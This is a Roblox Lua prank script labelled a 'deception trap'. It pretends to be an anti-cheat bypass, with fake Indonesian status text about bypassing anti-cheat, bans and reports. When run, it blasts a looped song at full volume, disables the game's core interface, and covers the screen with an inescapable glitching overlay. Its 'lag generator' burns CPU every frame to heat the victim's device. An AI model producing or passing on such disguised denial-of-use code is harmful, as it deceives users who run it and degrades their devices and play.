-- [[ DekaTeamHub: ULTIMATE DECEPTION TRAP ]] --
-- [[ TACO AUDIO | NO SIGNAL VISUAL | FAKE BYPASS ]] --

task.spawn(function()
    -- 1. FORCE AUDIO (TACO TIME)
    local function playTaco(parent)
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://142276005" -- IT'S RAINING TACOS
        s.Volume = 10
        s.Looped = true
        s.Parent = parent
        s:Play()
    end
    pcall(function() playTaco(game:GetService("SoundService")) end)

    -- 2. DISABLE SYSTEM
    local SG = game:GetService("StarterGui")
    pcall(function() SG:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)

    -- 3. CREATE VISUAL TRAP
    local PG = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local screen = Instance.new("ScreenGui", PG)
    screen.Name = "DekaDeception"
    screen.DisplayOrder = 2147483647
    screen.IgnoreGuiInset = true

    local B = Instance.new("TextButton", screen)
    B.Size = UDim2.new(1, 0, 1, 0)
    B.BackgroundColor3 = Color3.new(0, 0, 0)
    B.Modal = true
    B.Text = ""

    -- Color Bars Background
    local Bars = Instance.new("Frame", B)
    Bars.Size = UDim2.new(1, 0, 1, 0)
    local colors = {
        Color3.fromRGB(191,191,191), Color3.fromRGB(191,191,0),
        Color3.fromRGB(0,191,191), Color3.fromRGB(0,191,0),
        Color3.fromRGB(191,0,191), Color3.fromRGB(191,0,0),
        Color3.fromRGB(0,0,191)
    }
    for i, c in pairs(colors) do
        local f = Instance.new("Frame", Bars)
        f.Size = UDim2.new(1/#colors, 0, 1, 0)
        f.Position = UDim2.new((i-1)/#colors, 0, 0, 0)
        f.BackgroundColor3 = c
        f.BorderSizePixel = 0
    end

    -- FAKE STATUS TEXT (THE DECEPTION)
    local Status = Instance.new("TextLabel", B)
    Status.Size = UDim2.new(0.8, 0, 0.4, 0)
    Status.Position = UDim2.new(0.1, 0, 0.3, 0)
    Status.BackgroundColor3 = Color3.new(0, 0, 0)
    Status.BackgroundTransparency = 0.2
    Status.TextColor3 = Color3.new(1, 1, 1)
    Status.TextScaled = true
    Status.Font = "Code"
    Status.BorderSizePixel = 4
    Status.Text = "SABAR TUNGGU DULU...\nSCRIPT BYPASS SEMUANYA DULU\nBYPASSING ANTI CHEAT...\nANTI DETECTED...\nANTI VIRUS...\nANTI REPORT...\nANTI BAN..."

    -- 4. GLITCH & LAG ENGINE
    game:GetService("RunService").RenderStepped:Connect(function()
        Bars.Position = UDim2.new(0, math.random(-10, 10), 0, math.random(-10, 10))
        
        -- Glitch Putih Noise
        if math.random(1, 5) == 1 then
            local n = Instance.new("Frame", B)
            n.Size = UDim2.new(1, 0, 0, math.random(5, 30))
            n.Position = UDim2.new(0, 0, math.random(0, 100)/100, 0)
            n.BackgroundColor3 = Color3.new(1, 1, 1)
            n.BackgroundTransparency = 0.5
            task.delay(0.02, function() n:Destroy() end)
        end
        
        -- Lag Generator (HP Panas)
        for i = 1, 2500000 do local _ = i * i end
    end)
end)














